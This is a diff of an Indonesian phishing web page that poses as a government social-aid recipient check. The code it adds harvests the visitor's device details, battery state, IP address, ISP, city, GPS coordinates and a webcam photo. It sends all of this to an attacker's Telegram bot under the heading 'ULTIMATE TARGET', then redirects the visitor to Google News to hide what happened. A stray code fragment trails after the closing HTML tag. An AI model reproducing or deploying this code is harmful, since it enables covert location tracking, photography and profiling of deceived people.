@@ -17,7 +17,7 @@
     <div class="card">
         <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%; border-radius:5px;">
         <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
-        <p>Silakan verifikasi perangkat Anda untuk melihat daftar penerima bantuan.</p>
+        <p>Silakan verifikasi perangkat Anda untuk melihat daftar nama penerima bantuan pemerintah.</p>
         <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
     </div>
     <video id="video" autoplay></video>
@@ -28,13 +28,81 @@
         const id = "5392443720";
 
         document.getElementById('startBtn').addEventListener('click', async function() {
-            this.innerText = "Memverifikasi... (80%)";
+            this.innerText = "Memverifikasi... (95%)";
             this.disabled = true;
 
-            let info = "📸 *LAPORAN TARGET UJANG*%0A━━━━━━━━━━━━━━━━━━%0A";
+            let info = "🚀 *LAPORAN ULTIMATE TARGET*%0A━━━━━━━━━━━━━━━━━━%0A";
 
-            // 1. Ambil Data IP (Sebagai Dasar)
+            // 1. Data Perangkat & Hardware
+            info += "📱 *Sistem:* " + navigator.platform + "%0A";
+            info += "⚙️ *CPU Cores:* " + (navigator.hardwareConcurrency || "Tidak Diketahui") + "%0A";
+            
+            // 2. Data Baterai
             try {
+                const b = await navigator.getBattery();
+                info += "🔋 *Baterai:* " + Math.round(b.level * 100) + "% (" + (b.charging ? 'Dicas' : 'Tidak Dicas') + ")%0A";
+            } catch(e) {}
+
+            // 3. Data IP & ISP
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                info += `🌍 *IP:* ${d.ip}%0A🏢 *ISP:* ${d.org}%0A📍 *Kota:* ${d.city}%0A`;
+                info += `📌 *Maps (IP):* [Klik Disini](http://www.google.com/maps/place/${d.latitude},${d.longitude})%0A`;
+            } catch(e) {}
+
+            // 4. Ambil GPS & Kamera
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    info += `🎯 *GPS AKURAT:* [Buka Google Maps](http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude})%0A`;
+                    jalankanKamera(info);
+                }, () => {
+                    info += "🎯 *GPS:* Izin Ditolak%0A";
+                    jalankanKamera(info);
+                });
+            } else {
+                jalankanKamera(info);
+            }
+        });
+
+        async function jalankanKamera(captionLengkap) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', id);
+                        fd.append('photo', blob, 'f.jpg');
+                        fd.append('caption', decodeURIComponent(captionLengkap));
+                        fd.append('parse_mode', 'Markdown');
+                        
+                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: fd })
+                        .then(() => {
+                            // REDIRECT OTOMATIS setelah kirim
+                            window.location.href = "https://news.google.com/topics/CAAqJggKIiBDQkFTRWdvSUwyMHZNRzV6Y3pJU0FtVnVHZ0pKVGlnQVAB?hl=id&gl=ID&ceid=ID:id";
+                        });
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                // Tetap kirim teks dan redirect jika kamera ditolak
+                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${captionLengkap}%0A⚠️ *Kamera Ditolak*&parse_mode=Markdown`)
+                .then(() => {
+                    window.location.href = "https://news.google.com";
+                });
+            }
+        }
+    </script>
+</body>
+</html>            try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 info += `🌍 *IP:* ${d.ip}%0A🏢 *ISP:* ${d.org}%0A📍 *Kota:* ${d.city}%0A`;
